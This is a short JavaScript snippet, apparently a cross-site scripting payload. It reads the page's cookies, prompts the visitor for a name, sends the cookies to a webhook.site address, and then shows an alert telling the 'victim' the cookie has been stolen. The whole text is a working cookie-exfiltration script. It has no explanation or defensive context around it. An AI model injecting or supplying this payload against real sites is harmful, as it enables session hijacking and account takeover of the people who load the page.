var yourCookie = document.cookie;
var victimName = prompt("Enter your name: ");
var webhookUrl = "https://webhook.site/ac20ad76-224b-45b1-a6a4-f324b848b007";
var x = new XMLHttpRequest();
x.open("GET", `${webhookUrl}?cookie=${yourCookie}`, true);
x.send();
alert(`Hello dear ${victimName}, your cookie ${yourCookie} has been stolen...`);

